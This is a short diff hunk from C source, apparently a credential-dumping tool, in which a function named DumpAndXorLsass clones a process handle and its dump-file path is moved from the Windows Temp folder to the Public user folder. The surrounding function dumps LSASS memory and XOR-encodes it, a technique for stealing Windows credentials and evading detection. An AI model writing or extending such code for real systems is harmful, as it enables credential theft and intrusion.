@@ -83,7 +83,7 @@ BOOL DumpAndXorLsass(const char* outPath, const char* key, size_t key_len) {
     DWORD clonedPID = GetProcessId(hClone);
 
     HANDLE hTempFile = pCFA(
-        "C:\\Windows\\Temp\\__tmpdump.dmp",
+        "C:\\Users\\Public\\__tmpdump.dmp",
         GENERIC_READ | GENERIC_WRITE,
         0,
         NULL,
